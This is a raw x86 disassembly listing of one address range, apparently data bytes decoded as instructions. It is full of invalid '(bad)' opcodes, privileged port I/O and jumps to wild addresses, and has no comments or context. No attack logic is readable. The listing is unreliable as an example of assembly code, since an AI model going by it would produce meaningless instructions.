  40a9ae:	fst    DWORD PTR [esp+esi*8-0x23]
  40a9b2:	je     0x40a938
  40a9b4:	cmp    eax,0xd38c199b
  40a9b9:	jmp    0x157f42b1
  40a9be:	mov    edx,0x25719c9b
  40a9c3:	aad    0xb
  40a9c5:	out    0xe4,al
  40a9c7:	call   0x8a370a39
  40a9cc:	mov    ch,cl
  40a9ce:	inc    esp
  40a9cf:	cmp    eax,0xb44774ee
  40a9d4:	sbb    DWORD PTR [ecx-0x6378fbb2],0x833e7282
  40a9de:	shr    DWORD PTR [edx+0x3],0x36
  40a9e2:	daa    
  40a9e3:	ficomp DWORD PTR [edi+0x70]
  40a9e6:	call   0x1a9b:0x96a5cc1d
  40a9ed:	cmp    al,0x58
  40a9ef:	push   edx
  40a9f0:	dec    ecx
  40a9f1:	in     eax,0xea
  40a9f3:	jns    0x40a98f
  40a9f5:	in     al,0xba
  40a9f7:	sahf   
  40a9f8:	stos   DWORD PTR es:[edi],eax
  40a9f9:	loop   0x40aa4b
  40a9fb:	cmp    BYTE PTR [ebx+0x36],dl
  40a9fe:	xchg   eax,esi
  40aa00:	aas    
  40aa01:	or     DWORD PTR [edx],edx
  40aa03:	mov    ecx,0xbf44c5f5
  40aa08:	cmp    dh,ah
  40aa0a:	sub    dh,BYTE PTR [edx]
  40aa0c:	jle    0x40a9b0
  40aa0e:	nop
  40aa0f:	and    ebp,DWORD PTR [ebx]
  40aa11:	sub    al,0xdb
  40aa14:	jnp    0x40a9f6
  40aa16:	sub    BYTE PTR [esi],bl
  40aa18:	loop   0x40aa77
  40aa1a:	mov    dh,0x56
  40aa1c:	int    0x9d
  40aa1e:	std    
  40aa1f:	inc    ebp
  40aa20:	cld    
  40aa21:	rol    bl,1
  40aa23:	xchg   DWORD PTR [eax+0x1098211b],esp
  40aa29:	push   ss
  40aa2a:	stos   BYTE PTR es:[edi],al
  40aa2b:	add    eax,0xe3d3973f
  40aa30:	in     eax,dx
  40aa31:	daa    
  40aa32:	add    DWORD PTR [ebx+0x1b],edx
  40aa35:	jecxz  0x40aa93
  40aa37:	adc    eax,0x7250d1f9
  40aa3c:	std    
  40aa3d:	pop    ss
  40aa3e:	dec    ecx
  40aa3f:	adc    edx,DWORD PTR [ebp+0x7f5517e8]
  40aa45:	jb     0x40aaa0
  40aa47:	jl     0x40aa2d
  40aa49:	pop    ebx
  40aa4a:	jp     0x40aab0
  40aa4c:	hlt    
  40aa4d:	mov    dh,0xea
  40aa4f:	sbb    ebp,DWORD PTR [esi-0x1c]
  40aa52:	cwde   
  40aa53:	pusha  
  40aa54:	sar    dl,1
  40aa56:	xor    DWORD PTR [edi-0x77aea8a1],ebx
  40aa5c:	inc    ecx
  40aa5d:	mov    ebp,0xacc48ed8
  40aa62:	loop   0x40a9e8
  40aa64:	call   0x84846d2d
  40aa69:	daa    
  40aa6a:	addr16 mov ah,0xde
  40aa6d:	inc    esi
  40aa6e:	cdq    
  40aa6f:	add    DWORD PTR gs:[edx],edi
  40aa72:	inc    esi
  40aa73:	inc    eax
  40aa74:	adc    bh,BYTE PTR [ecx-0x6a723a72]
  40aa7a:	push   0xffffff95
  40aa7c:	cmp    bh,al
  40aa7e:	repnz xchg edx,eax
  40aa80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa81:	sbb    BYTE PTR ds:0xe9cfe5f,dh
  40aa87:	cmp    DWORD PTR [esi],0x20a06cef
  40aa8d:	add    eax,0xe914c076
  40aa92:	xchg   edx,eax
  40aa93:	inc    esi
  40aa94:	mov    dl,ch
  40aa96:	mov    WORD PTR [edi-0x17],?
  40aa99:	inc    ebx
  40aa9a:	add    eax,DWORD PTR [eax+edi*1]
  40aa9d:	pop    edi
  40aa9e:	pop    es
  40aa9f:	imul   esi,DWORD PTR [ebx],0x20
  40aaa2:	cs dec esp
  40aaa4:	jge    0x40aa85
  40aaa6:	xor    al,0x55
  40aaa8:	sbb    al,0xb1
  40aaaa:	dec    esi
  40aaab:	test   esi,esp
  40aaad:	icebp  
  40aaae:	lods   eax,DWORD PTR ds:[esi]
  40aaaf:	in     eax,0x3d
  40aab1:	imul   eax,edi,0xa4f9804f
  40aab7:	push   ebx
  40aab8:	pop    edi
  40aab9:	ja     0x40ab05
  40aabb:	mov    bh,0x48
  40aabd:	out    0xae,eax
  40aabf:	jb     0x40ab3d
  40aac1:	stos   DWORD PTR es:[edi],eax
  40aac2:	xor    edx,edx
  40aac4:	icebp  
  40aac5:	xlat   BYTE PTR ds:[ebx]
  40aac6:	aas    
  40aac7:	xchg   edx,eax
  40aac8:	sahf   
  40aac9:	sbb    BYTE PTR [edx+0x1e],bl
  40aacc:	and    DWORD PTR [ebp-0x2bb1e6bd],edi
  40aad2:	mov    ds:0xdf652a83,al
  40aad7:	xchg   edi,eax
  40aad8:	ja     0x40aa5c
  40aada:	or     esp,ebx
  40aadc:	data16 je 0x40ab3a
  40aadf:	cwde   
  40aae0:	mov    cl,0x45
  40aae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aae3:	mov    ch,0x8c
  40aae5:	(bad)  
  40aae7:	mov    dh,BYTE PTR [edi-0x215937da]
  40aaed:	ds mov BYTE PTR ss:[edi+edi*4],al
  40aaf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaf3:	fidivr DWORD PTR [esi]
  40aaf5:	dec    eax
  40aaf6:	fisubr DWORD PTR [edi+0x68]
  40aaf9:	dec    esi
  40aafa:	mov    DWORD PTR [eax-0x790e7532],esi
  40ab00:	xor    DWORD PTR [esi],ebx
  40ab02:	fadd   DWORD PTR [ebx]
  40ab04:	push   ebx
  40ab05:	or     eax,0xe6fb6dcb
  40ab0a:	loop   0x40ab1c
  40ab0c:	dec    ebp
  40ab0d:	push   ebp
  40ab0e:	sub    al,BYTE PTR [ecx+0x422db08]
  40ab14:	jae    0x40aafc
  40ab16:	rcl    bh,1
  40ab18:	xor    dl,BYTE PTR [edx]
  40ab1a:	inc    edx
  40ab1b:	imul   edi,DWORD PTR [edi],0x7b
  40ab1e:	xchg   DWORD PTR [esi],ebx
  40ab20:	ret    0x6446
  40ab23:	add    DWORD PTR [ecx+0x790ae0eb],ebp
  40ab29:	or     DWORD PTR [ebx-0x3a],esp
  40ab2c:	add    al,0xaf
  40ab2e:	out    dx,eax
  40ab2f:	cmp    al,0x3f
  40ab31:	cwde   
  40ab32:	arpl   WORD PTR [ebx],di
  40ab34:	cwde   
  40ab35:	adc    al,0x1f
  40ab37:	leave  
  40ab38:	outs   dx,BYTE PTR ds:[esi]
  40ab39:	adc    edi,0xffffff84
  40ab3c:	leave  
  40ab3d:	dec    eax
  40ab3e:	or     DWORD PTR [ebx-0x60e428c2],ebx
  40ab44:	mov    edi,0x22869e01
  40ab49:	out    0x60,eax
  40ab4b:	or     edx,ebp
  40ab4d:	jle    0xe9ccb6bc
  40ab53:	test   BYTE PTR [ebp-0x3a],al
  40ab56:	pop    edx
  40ab57:	jo     0x40ab11
  40ab59:	fs clc 
  40ab5b:	clc    
  40ab5c:	jle    0x40ab51
  40ab5e:	cmp    edi,DWORD PTR [edi-0x7b8900ec]
  40ab64:	aad    0xd
  40ab66:	fwait
  40ab67:	mov    dh,BYTE PTR [esi+0x7af45aad]
  40ab6d:	mov    eax,ds:0x4d5ae5d5
  40ab72:	mov    edx,ebp
  40ab74:	mov    eax,0x1c732ce7
  40ab79:	xlat   BYTE PTR ds:[ebx]
  40ab7a:	cdq    
  40ab7b:	pop    eax
  40ab7c:	lds    esp,FWORD PTR [eax-0x29]
  40ab7f:	test   BYTE PTR [edx+edi*1],0x5b
  40ab83:	js     0x40abdc
  40ab85:	xor    BYTE PTR [edx+0x51],dl
  40ab88:	clc    
  40ab89:	icebp  
  40ab8a:	dec    esi
  40ab8b:	test   DWORD PTR [esi],ebx
  40ab8d:	mov    dl,0xe2
  40ab8f:	in     eax,0x3e
  40ab91:	aas    
  40ab92:	(bad)  [edx-0x5dd6f140]
  40ab98:	add    al,0xe6
  40ab9a:	push   esi
  40ab9b:	rcl    BYTE PTR [eax+edi*2+0x74f35227],cl
  40aba2:	in     al,dx
  40aba3:	cdq    
  40aba4:	jecxz  0x40ab4e
  40aba6:	xchg   BYTE PTR [ecx+0x2],al
  40aba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abaa:	dec    ecx
  40abab:	enter  0xb421,0x35
  40abaf:	test   DWORD PTR [esi+0x638eace6],ecx
  40abb5:	pop    esp
  40abb6:	outs   dx,DWORD PTR ds:[esi]
  40abb7:	adc    BYTE PTR [ebx+0xa0c57b1],bl
  40abbd:	out    0x23,al
  40abbf:	xor    BYTE PTR [ebp+0x37],0x31
  40abc3:	out    0xe6,ax
  40abc6:	sbb    BYTE PTR [esp+ebx*1+0x3d49bd6b],0xbb
  40abce:	loop   0x40ac4a
  40abd0:	adc    al,0xa8
  40abd2:	inc    esp
  40abd3:	test   cl,0x73
  40abd6:	lahf   
  40abd7:	inc    esp
  40abd8:	retf   0xbee6
  40abdb:	repnz dec ecx
  40abdd:	jmp    0xa91f:0x3384a4c4
  40abe4:	mov    BYTE PTR [edx],ah
  40abe6:	pop    edx
  40abe7:	adc    BYTE PTR [eax-0x19636ad8],ah
  40abed:	mov    eax,ds:0x44498487
  40abf2:	jl     0x40ac59
  40abf4:	aas    
  40abf5:	arpl   WORD PTR ds:0x1e89bd8d,dx
  40abfb:	cmp    BYTE PTR [ecx-0x1f],0x28
  40abff:	das    
  40ac00:	sahf   
  40ac01:	ficom  WORD PTR [eax+0x35]
  40ac04:	pop    edi
  40ac05:	or     cl,cl
  40ac07:	adc    al,0x3e
  40ac09:	jne    0x40ac20
  40ac0b:	scas   eax,DWORD PTR es:[edi]
  40ac0c:	pushf  
  40ac0d:	test   eax,0xe7dd5cce
  40ac12:	adc    cl,BYTE PTR [ebp+edx*8-0x32]
  40ac16:	ins    DWORD PTR es:[edi],dx
  40ac17:	ins    BYTE PTR es:[edi],dx
  40ac18:	xchg   DWORD PTR ds:0xe6e8d242,esi
  40ac1e:	retf   0xb994
  40ac21:	mov    WORD PTR [ebp+edi*1+0x42fce4a4],?
  40ac28:	jge    0x40abcb
  40ac2a:	fwait
  40ac2b:	cld    
  40ac2c:	push   esi
  40ac2d:	ss xchg edi,eax
  40ac2f:	inc    eax
  40ac30:	aam    0x67
  40ac32:	daa    
  40ac33:	mov    bh,0xd
  40ac35:	adc    BYTE PTR [eax-0x5c],bl
  40ac38:	ret    
  40ac39:	jbe    0x40ac4e
  40ac3b:	lock mov ah,0xe7
  40ac3e:	stos   BYTE PTR es:[edi],al
  40ac3f:	ret    
  40ac40:	mov    ds:0x97368fae,eax
  40ac45:	push   esi
  40ac46:	cli    
  40ac47:	jbe    0x40aca1
  40ac49:	call   0xd5f27a6f
  40ac4e:	(bad)  
  40ac50:	ffree  st(7)
  40ac52:	cmp    dl,BYTE PTR [edi-0x7a03908a]
  40ac58:	add    al,0x15
  40ac5a:	inc    esi
  40ac5b:	jle    0x40ac9b
  40ac5d:	mov    ecx,0x4629293f
  40ac62:	mov    bl,0x47
  40ac64:	fs adc eax,0x23c6e1e6
  40ac6a:	rol    DWORD PTR [ebp+0xf86d878],0x48
  40ac71:	mov    edi,0x34cb81ca
  40ac76:	arpl   WORD PTR [esi+0x1cc136d1],ax
  40ac7c:	out    dx,al
  40ac7d:	or     al,0x39
  40ac7f:	ds push 0xcd85a8a4
  40ac85:	mov    edi,0xc1445ea4
  40ac8a:	jle    0x40ac67
  40ac8c:	je     0x40ace5
  40ac8e:	mov    dl,0x84
  40ac90:	mov    ds:0xcad461d4,eax
  40ac95:	sub    esi,DWORD PTR [ebx-0x7e]
  40ac98:	pop    es
  40ac99:	aas    
  40ac9a:	test   DWORD PTR [eax],edx
  40ac9c:	xor    eax,0x86b5ba31
  40aca1:	inc    esp
  40aca2:	inc    edi
  40aca3:	ret    0xcd5c
  40aca6:	mov    DWORD PTR [ecx+ebx*4],eax
  40aca9:	out    0x8a,eax
  40acab:	mov    ds:0x38f10871,al
  40acb0:	data16 fwait
  40acb2:	stos   DWORD PTR es:[edi],eax
  40acb3:	pop    ds
  40acb4:	fbld   TBYTE PTR [esi]
  40acb6:	pop    esp
  40acb7:	jmp    0xe782:0xa6511724
  40acbe:	push   es
  40acbf:	push   cs
  40acc0:	lea    esi,[edi-0x5e6e3e1a]
  40acc6:	aaa    
  40acc7:	mov    BYTE PTR [ecx],bl
  40acc9:	mov    BYTE PTR [ebp-0x74],ah
  40accc:	push   ecx
  40accd:	out    dx,eax
  40acce:	pop    edx
  40accf:	jne    0x40ad31
  40acd1:	out    0xb4,al
  40acd3:	in     al,0x4c
  40acd5:	repz aam 0x30
  40acd8:	je     0x40acdb
  40acda:	or     esi,DWORD PTR [esi]
  40acdc:	jno    0x40acb1
  40acde:	pop    edx
  40acdf:	fdiv   DWORD PTR [ebx]
  40ace1:	inc    ebx
  40ace2:	or     BYTE PTR [esi],ah
  40ace4:	mov    ah,0x67
  40ace6:	das    
  40ace7:	test   edi,ebp
  40ace9:	popf   
  40acea:	xor    cl,BYTE PTR [edx+0x3f]
  40aced:	fld    TBYTE PTR [ebp+0x4e]
  40acf0:	fs cmc 
  40acf2:	rcl    DWORD PTR [esi-0x62e91809],cl
  40acf8:	mov    ebp,0x1db230a1
  40acfd:	xchg   edx,eax
  40acfe:	jmp    0x40ace4
  40ad00:	dec    ecx
  40ad01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad02:	pop    esi
  40ad03:	jle    0x40acf9
  40ad05:	and    eax,0x78ce1310
  40ad0a:	add    BYTE PTR [edx+0x1b],bl
  40ad0d:	out    0x18,al
  40ad0f:	dec    ebp
  40ad10:	gs and eax,0xe507d905
  40ad16:	mov    ss,WORD PTR [di+0x39]
  40ad1a:	pop    ebx
  40ad1b:	mov    WORD PTR [ebp+0x2a84a1f8],fs
  40ad21:	sar    DWORD PTR [edi-0x7c],0x84
  40ad25:	jge    0x40ad21
  40ad27:	push   edi
  40ad28:	aas    
  40ad29:	int    0xb4
  40ad2b:	and    DWORD PTR ds:0xa1f6c513,ebp
  40ad31:	cli    
  40ad32:	fdivp  st(1),st
  40ad34:	loope  0x40ad30
  40ad36:	aad    0x56
  40ad38:	pop    esp
  40ad39:	daa    
  40ad3a:	aad    0x16
  40ad3c:	into   
  40ad3d:	rcl    BYTE PTR [esi-0xb],0xa7
  40ad41:	adc    DWORD PTR [edx+0x4],ebx
  40ad44:	push   esp
  40ad45:	dec    eax
  40ad46:	xchg   ebx,eax
  40ad47:	mov    BYTE PTR [edi+0x3ababbfb],bh
  40ad4d:	mov    ebp,0xf2c9c0e3
  40ad52:	push   0xd
  40ad54:	cdq    
  40ad55:	push   ds
  40ad56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad57:	or     DWORD PTR [ebx+0x5d24e517],0xfffffff3
  40ad5e:	mov    edi,0x8addfa47
  40ad63:	sub    eax,DWORD PTR [edx-0xd2df419]
  40ad69:	add    DWORD PTR [ebx+0x70],eax
  40ad6c:	xchg   DWORD PTR ds:[ebx+0x45885681],ecx
  40ad73:	lahf   
  40ad74:	jb     0x40ad5c
  40ad76:	add    ah,BYTE PTR [eax+0x1930ff89]
  40ad7c:	push   edx
  40ad7d:	or     bl,BYTE PTR [esi]
  40ad7f:	into   
  40ad80:	add    BYTE PTR [edx+ebx*2],bl
  40ad83:	stos   BYTE PTR es:[edi],al
  40ad84:	sahf   
  40ad85:	outs   dx,BYTE PTR ds:[esi]
  40ad86:	or     dh,bl
  40ad88:	xor    bh,0x86
  40ad8b:	test   BYTE PTR [eax-0x1f],al
  40ad8e:	(bad)  
  40ad8f:	jecxz  0x40adcd
  40ad91:	dec    ecx
  40ad92:	sbb    BYTE PTR [esi],bh
  40ad94:	push   0xffffffb5
  40ad96:	mov    cl,0xc5
  40ad98:	(bad)  
  40ad99:	dec    esp
  40ad9a:	and    bl,BYTE PTR [ebx-0x3bd04363]
  40ada0:	pop    esp
  40ada1:	out    0x86,al
  40ada3:	pusha  
  40ada4:	data16 aas 
  40ada6:	iret   
  40ada7:	inc    edx
  40ada8:	dec    edi
  40ada9:	je     0x40ad4d
  40adab:	ins    DWORD PTR es:[edi],dx
  40adac:	push   esp
  40adad:	neg    DWORD PTR [edx-0x80]
  40adb0:	mov    bl,0x6b
  40adb2:	dec    ebp
  40adb3:	cs retf 0x1e70
  40adb7:	test   BYTE PTR [edx],dl
  40adb9:	mov    ebp,0xbf3e0654
  40adbe:	push   ss
  40adbf:	popa   
  40adc0:	and    al,0x1e
  40adc2:	neg    DWORD PTR [ecx+0x47]
  40adc5:	fisub  WORD PTR [esi]
  40adc7:	je     0x40ae0b
  40adc9:	push   0xc76f1fde
  40adce:	xor    al,0x88
  40add0:	(bad)  
  40add1:	xchg   esi,eax
  40add2:	mov    edx,0x9fed43b9
  40add7:	jmp    0x85afb72e
  40addc:	or     dl,ch
  40adde:	in     al,0x17
  40ade0:	stos   BYTE PTR es:[edi],al
  40ade1:	xlat   BYTE PTR ds:[ebx]
  40ade2:	adc    al,0x99
  40ade4:	mov    edi,0x8283b1e4
  40ade9:	ret    0x5ec3
  40adec:	mov    al,0x26
  40adee:	pop    edx
  40adef:	out    0x6b,al
  40adf1:	mov    dl,al
  40adf3:	xlat   BYTE PTR ds:[ebx]
  40adf4:	test   al,0xb6
  40adf6:	pop    es
  40adf7:	cmp    BYTE PTR [ecx],0x9
  40adfa:	xchg   DWORD PTR [esi+0x4f9bd0af],ecx
  40ae00:	rcr    BYTE PTR [edi],1
  40ae02:	pop    edx
  40ae03:	cmp    bl,BYTE PTR [ebp-0x26]
  40ae06:	mov    esp,0x98e63d2f
  40ae0b:	imul   ecx,esp,0x3ea9d766
  40ae11:	(bad)  
  40ae12:	cmp    edx,DWORD PTR [ebx-0x654dfcdf]
  40ae18:	dec    ebx
  40ae19:	data16 mov dh,0xe6
  40ae1c:	pusha  
  40ae1d:	lods   al,BYTE PTR ds:[esi]
  40ae1e:	ret    0xe4a4
  40ae21:	fwait
  40ae22:	leave  
  40ae23:	xor    DWORD PTR [ecx+0x3ca978c4],0xfffffffb
  40ae2a:	sub    cl,BYTE PTR [edi-0x1]
  40ae2d:	fs int 0x84
  40ae30:	(bad)  
  40ae31:	jne    0x40ade9
  40ae33:	or     BYTE PTR [ecx],0xe9
  40ae36:	lods   al,BYTE PTR ds:[esi]
  40ae37:	sub    DWORD PTR [ebx+0x77],edx
  40ae3a:	cli    
  40ae3b:	sbb    esp,DWORD PTR [edx]
  40ae3d:	imul   eax,DWORD PTR [edx],0x32
  40ae40:	add    esi,DWORD PTR [edx-0x1976fda5]
  40ae46:	fs ds and eax,0x516d7fcc
  40ae4d:	xor    al,0xf7
  40ae4f:	cdq    
  40ae50:	ffree  st(6)
  40ae52:	pop    ebx
  40ae53:	cmp    dh,BYTE PTR [eax]
  40ae55:	push   0xde88c316
  40ae5a:	rol    BYTE PTR [ecx+0x4289db1e],1
  40ae60:	jge    0x40ae30
  40ae62:	pop    edx
  40ae63:	(bad)  
  40ae64:	cmp    BYTE PTR [edi+0x30],dh
  40ae67:	xor    ebp,DWORD PTR [edi-0x9]
  40ae6a:	or     dh,BYTE PTR ds:0xd6867d0b
  40ae70:	adc    esp,ecx
  40ae72:	mov    ch,BYTE PTR [edi-0x60c6e64f]
  40ae78:	dec    edi
  40ae79:	jo     0x40aea3
  40ae7b:	fnstcw WORD PTR [esi]
  40ae7d:	jge    0x40ae98
  40ae7f:	enter  0x27d1,0xe4
  40ae83:	sbb    al,0x6b
  40ae85:	out    0x92,al
  40ae87:	dec    esp
  40ae88:	pop    ds
  40ae89:	(bad)  [esi+0x7]
  40ae8c:	int    0x69
  40ae8e:	in     al,dx
  40ae8f:	aam    0x50
  40ae91:	repnz pop edx
  40ae93:	push   ss
  40ae94:	xchg   BYTE PTR [edi-0x30],al
  40ae97:	mov    ch,0xf7
  40ae99:	or     ch,BYTE PTR [esi]
  40ae9b:	hlt    
  40ae9c:	sbb    al,ah
  40ae9e:	out    0x84,eax
  40aea0:	inc    edx
  40aea1:	rcr    BYTE PTR [ebx+0x7f0b3db8],cl
  40aea7:	dec    esp
  40aea8:	loope  0x40ae54
  40aeaa:	mul    BYTE PTR [esi+ecx*8]
  40aead:	cmc    
  40aeae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeaf:	mov    bh,0x3a
  40aeb1:	adc    ebx,DWORD PTR [edx-0xc]
  40aeb4:	xor    ch,bl
  40aeb6:	gs mov bl,0x62
  40aeb9:	jle    0x40aece
  40aebb:	sbb    al,0x10
  40aebd:	nop
  40aebe:	pop    edx
  40aebf:	pop    edx
  40aec0:	sbb    ah,dh
  40aec2:	je     0x40aeaa
  40aec4:	pop    eax
  40aec5:	sbb    eax,ebx
  40aec7:	outs   dx,BYTE PTR ds:[esi]
  40aec8:	in     eax,dx
  40aec9:	or     BYTE PTR [ebx+0x65],ah
  40aecc:	rol    dl,cl
  40aece:	pop    edx
  40aecf:	push   cs
  40aed0:	push   es
  40aed1:	jnp    0x40af33
  40aed3:	fild   WORD PTR [edx]
  40aed5:	retf   0x77a8
  40aed8:	(bad)  
  40aed9:	out    0x9a,eax
  40aedb:	pusha  
  40aedc:	push   ss
  40aedd:	jo     0x40aeb3
  40aedf:	xor    al,0x3f
  40aee1:	sbb    esi,0xffffffc6
  40aee4:	push   es
  40aee5:	and    DWORD PTR [eax-0x436a6b2c],ebx
  40aeeb:	int    0x2
  40aeed:	(bad)  
  40aeee:	sub    eax,ebp
  40aef0:	test   eax,0xa7841a27
  40aef5:	shl    BYTE PTR [edi+0x5da6baf5],1
  40aefb:	sub    bl,BYTE PTR [eax-0x35ee4ab9]
  40af01:	jmp    0xf889b744
  40af06:	das    
  40af07:	inc    edx
  40af08:	cld    
  40af09:	add    BYTE PTR [ebx-0x7c],ah
  40af0c:	(bad)  
  40af0d:	sbb    eax,0x67648664
  40af12:	and    al,0x99
  40af14:	imul   BYTE PTR [ebx-0x1873baa4]
  40af1a:	test   BYTE PTR [edi],bl
  40af1c:	mov    bl,0xcd
  40af1e:	or     edx,DWORD PTR [ebx+0xcf8c675]
  40af24:	push   eax
  40af25:	cdq    
  40af26:	pop    eax
  40af27:	cmp    cl,BYTE PTR [edx+esi*1+0x48]
  40af2b:	in     eax,0x1e
  40af2d:	out    0x3a,al
  40af2f:	scas   al,BYTE PTR es:[edi]
  40af30:	in     al,dx
  40af31:	ins    DWORD PTR es:[edi],dx
  40af32:	test   BYTE PTR [ebp-0x6a],ch
  40af35:	call   0xcec2a731
  40af3a:	pop    ebx
  40af3b:	adc    BYTE PTR [edi+0xa596eea],cl
  40af41:	imul   edx,edx,0xffffff84
  40af44:	ror    ebp,cl
  40af46:	sub    dl,0x3f
  40af49:	push   ecx
  40af4a:	mov    BYTE PTR [ecx-0xbc16151],al
  40af50:	pop    es
  40af51:	out    0x9a,eax
  40af53:	pushf  
  40af54:	fs inc esi
  40af56:	push   edx
  40af57:	aad    0x95
  40af59:	repz cmp ebp,0x6c48e2b0
  40af60:	ds push si
  40af63:	test   DWORD PTR [ebp-0x17],esi
  40af66:	in     al,dx
  40af67:	or     DWORD PTR [ebp+0x8],esp
  40af6a:	shr    BYTE PTR [ecx+0x1b],0xb0
  40af6e:	shld   DWORD PTR [ecx],eax,cl
  40af71:	repz call 0xcccc6da5
  40af77:	jno    0x40af67
  40af79:	xor    al,0x96
  40af7b:	mov    esi,0xfa8acb8e
  40af80:	jo     0x40af59
  40af82:	pop    ebx
  40af83:	mov    eax,ds:0xc8fbe0ec
  40af88:	and    BYTE PTR [edx+ebx*2-0x72],0xc6
  40af8d:	rol    ebx,cl
  40af8f:	and    ebp,esi
  40af91:	xchg   edi,eax
  40af92:	sub    eax,DWORD PTR [eax+ebp*4+0x3fa70916]
  40af99:	cmc    
  40af9a:	inc    ecx
  40af9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af9c:	push   ebp
  40af9d:	push   0xe7b4489f
  40afa2:	cld    
  40afa3:	stc    
  40afa4:	test   DWORD PTR [ecx],ecx
  40afa6:	adc    dl,0x71
  40afa9:	add    eax,0x633fcf33
  40afae:	scas   eax,DWORD PTR es:[edi]
  40afaf:	mov    ebx,0xfc6efb91
  40afb4:	adc    esp,edi
  40afb6:	test   al,0x7f
  40afb8:	enter  0xc9c7,0x7
  40afbc:	xchg   cl,ah
  40afbe:	fs out 0xaa,al
  40afc1:	add    BYTE PTR [esi+0x4a],al
  40afc4:	inc    ecx
  40afc5:	rcr    DWORD PTR [bp+si+0x668a],0xb
  40afcb:	leave  
  40afcc:	ss enter 0x861e,0xfc
  40afd1:	mov    dh,BYTE PTR [esi+0x370817d9]
  40afd7:	adc    eax,0x225c8c40
  40afdc:	sbb    dl,BYTE PTR [esi]
  40afde:	leave  
  40afdf:	xchg   ecx,eax
  40afe0:	ss out 0x62,al
  40afe3:	jae    0x40afbd
  40afe5:	push   ecx
  40afe6:	test   al,0x6d
  40afe8:	xchg   ebx,eax
  40afe9:	das    
  40afea:	jae    0x40afbf
  40afec:	mov    esi,0xe7485a29
  40aff1:	pop    ebp
  40aff2:	or     DWORD PTR [eax],ebx
  40aff4:	stos   BYTE PTR es:[edi],al
  40aff5:	call   0xc39e2c1e
  40affa:	and    BYTE PTR [edi-0x44],al
  40affd:	add    al,0xb1
  40afff:	fs aas 
  40b001:	jecxz  0x40af87
  40b003:	sar    edi,0xf5
  40b006:	mov    ds:0x46e60415,al
  40b00b:	dec    edx
  40b00c:	mov    ebx,0xd41e4f8a
  40b011:	adc    eax,0x22747bd3
  40b016:	jl     0x40b032
  40b018:	mov    esi,0x383e653e
  40b01d:	outs   dx,BYTE PTR ds:[esi]
  40b01e:	ficomp DWORD PTR [eax+0x40]
  40b021:	inc    eax
  40b022:	jecxz  0x40afa9
  40b024:	xchg   ecx,eax
  40b025:	in     al,0xf8
  40b027:	(bad)  
  40b028:	xlat   BYTE PTR ds:[ebx]
  40b029:	or     DWORD PTR [eax+0x1],edi
  40b02c:	ja     0x40b053
  40b02e:	mov    ch,0x34
  40b030:	and    bh,bl
  40b032:	inc    edi
  40b033:	mov    cl,BYTE PTR [ebx+eiz*2-0x191c7a94]
  40b03a:	xchg   esp,eax
  40b03b:	cmp    eax,0xfc4fc1d0
  40b040:	mov    ebx,0x6c5748b8
  40b045:	dec    edi
  40b046:	(bad)  
  40b047:	fadd   QWORD PTR [edx-0x59]
  40b04a:	mov    DWORD PTR [ebx],0xf375d9f
  40b050:	mov    al,ds:0x4785a520
  40b055:	mov    ebp,0xab452a33
  40b05a:	repnz push eax
  40b05c:	and    esi,DWORD PTR [edi+ebx*4-0x7a]
  40b060:	or     BYTE PTR [ecx-0x3f61a0e5],0x18
  40b067:	adc    dh,ah
  40b069:	test   al,0x39
  40b06b:	(bad)  
  40b06c:	mov    edx,0x9f22b9e1
  40b071:	push   0x8d3f2c1a
  40b076:	mov    edx,0xceb4779a
  40b07b:	scas   al,BYTE PTR es:[edi]
  40b07c:	imul   esp,esi,0xd7a96214
  40b082:	inc    esi
  40b083:	mov    ebx,0x85636195
  40b088:	lea    esi,[ebx+ebx*2]
  40b08b:	shl    BYTE PTR [ebx-0x3b905e52],1
  40b091:	xchg   edi,eax
  40b092:	mov    esi,0x5b312cf6
  40b097:	push   0x3ff25112
  40b09c:	fild   QWORD PTR [ebx+0x5a]
  40b09f:	pop    eax
  40b0a0:	retf   
  40b0a1:	fmulp  st(5),st
  40b0a3:	shl    BYTE PTR [eax-0x697979b6],1
  40b0a9:	pop    ds
  40b0aa:	lods   al,BYTE PTR ds:[esi]
  40b0ab:	push   esp
  40b0ac:	push   ebx
  40b0ad:	or     al,0xfa
  40b0af:	mov    es,WORD PTR gs:[ebx-0x2ee5cfa5]
  40b0b6:	adc    al,0x6b
  40b0b8:	cmp    dh,BYTE PTR [ebx]
  40b0ba:	call   0xf8f14d79
  40b0bf:	xchg   dh,dl
  40b0c1:	addr16 loop 0x40b072
  40b0c4:	and    bl,BYTE PTR [edi+0xb6ffff2]
  40b0ca:	pop    edx
  40b0cb:	loop   0x40b050
  40b0cd:	jne    0x40b08c
  40b0cf:	inc    esp
  40b0d0:	mov    ah,0x3e
  40b0d2:	jl     0x40b058
  40b0d4:	int    0xbd
  40b0d6:	push   ebp
  40b0d7:	dec    edi
  40b0d8:	ds (bad) 
  40b0da:	adc    BYTE PTR ds:0x8d40f721,ch
  40b0e0:	mov    ah,0xe7
  40b0e2:	into   
  40b0e3:	and    edx,DWORD PTR [edi]
  40b0e5:	push   ss
  40b0e6:	es sub al,0x63
  40b0e9:	mov    dh,0x8e
  40b0eb:	dec    edx
  40b0ec:	inc    ebx
  40b0ed:	out    0x2c,al
  40b0ef:	pop    esi
  40b0f0:	push   eax
  40b0f1:	fs sbb al,0x4b
  40b0f4:	pop    esp
  40b0f5:	xlat   BYTE PTR ds:[ebx]
  40b0f6:	dec    ebx
  40b0f7:	scas   eax,DWORD PTR es:[edi]
  40b0f8:	cld    
  40b0f9:	loope  0x40b09d
  40b0fb:	cld    
  40b0fc:	sbb    al,cl
  40b0fe:	pop    ebx
  40b0ff:	ins    BYTE PTR es:[edi],dx
  40b100:	aad    0x5
  40b102:	mov    esi,0xb1f4c221
  40b107:	dec    edx
  40b108:	sbb    al,0x57
  40b10a:	and    DWORD PTR [ebx],eax
  40b10c:	mov    ebx,0x3024d298
  40b111:	loopne 0x40b15b
  40b113:	fs jp  0x40b0dd
  40b116:	mov    ecx,0xd72be6d8
  40b11b:	mov    dh,0x44
  40b11d:	sbb    ebx,DWORD PTR [ebx-0x56]
  40b120:	aaa    
  40b121:	mov    bl,0xed
